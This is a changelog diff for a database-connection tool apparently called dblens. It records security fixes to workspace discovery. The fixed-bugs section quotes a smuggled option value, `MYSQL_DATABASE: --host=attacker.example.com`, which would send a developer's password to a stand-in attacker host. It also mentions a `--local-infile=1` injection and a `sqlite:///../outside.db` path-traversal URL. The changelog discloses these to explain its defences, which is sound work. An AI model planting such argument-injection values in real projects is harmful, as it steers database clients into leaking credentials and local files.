@@ -19,7 +19,38 @@ All notable changes to this project are documented here. Format follows
     file stays in memory for that session: `connections.save` now writes only `source = 'file'`
     specs, so nothing discovery reads can reach the connections file.
   - The walk never follows a symlink and never reads above the workspace root, and is bounded in
-    depth, entries, hits and wall-clock time, a few directories per tick.
+    depth, entries, hits and wall-clock time, a few directories per tick. A file path a `.env`
+    *names* is held to the same boundary: one resolving above the root is dropped, not offered.
+  - What a workspace file says is treated as untrusted input. Every connection field that becomes
+    an argument of the client dblens spawns is refused if it would be read as an **option** rather
+    than as data, so a cloned repository cannot steer the client. Candidates dropped for that (or
+    for any other validation failure) are reported next to what was found.
+
+### Fixed
+
+- **Discovery: a cloned repository could steer the mysql/mariadb client through its own argv.**
+  `mysql`/`mariadb` validation carried no bare-name rule (postgres and mssql did), and the database
+  was appended as a bare positional, so a `docker-compose.yml` with
+  `MYSQL_DATABASE: --host=attacker.example.com` produced a candidate whose "database" the client
+  parses as an option — with `MYSQL_PWD` set to a password `${VAR}` interpolation had taken from
+  the developer's own environment. `--local-infile=1` re-enabled, the same way, the local file read
+  the adapter disables one argument earlier. Both engines now reject a database that is not a bare
+  name, every adapter rejects a host/user/database (and `dblens.path` a file path, expanded as well
+  as raw) that starts with `-`, and the database is passed as `--database=<name>` so its value is
+  bound to its option. Validation is shared between the two engines rather than copied.
+- **Discovery: a `.env` file URL could point above the workspace root.** `sqlite:///../outside.db`
+  resolved out of the project and was offered, contradicting a security property stated in the
+  README, the vimdoc and this changelog. Such a candidate is now dropped.
+- **Discovery: the commonest `ports:` form found nothing.** The inline flow sequence
+  (`ports: ["5432:5432"]`) was not parsed at all, so a single-service compose file written that way
+  discovered no database. Both sequence forms are read now, for `ports:` and `environment:`.
+- **Discovery: a `/` in a URL password mis-framed the whole URL.** `postgres://u:aB3/xY9@host/app`
+  parsed the host as `u:aB3`, so the real database never appeared. The authority now ends at the
+  userinfo when the password holds an unencoded `/`.
+- **Discovery: two of the four scan bounds pruned silently.** The depth bound and the per-category
+  hit cap did not set `truncated`, so a project whose databases sit deeper than the bound was told
+  "found no databases" with no caveat. All four bounds report now, and the hit cap is checked
+  before the file is opened to classify it.
 
 ## [1.0.0] - 2026-08-15
 
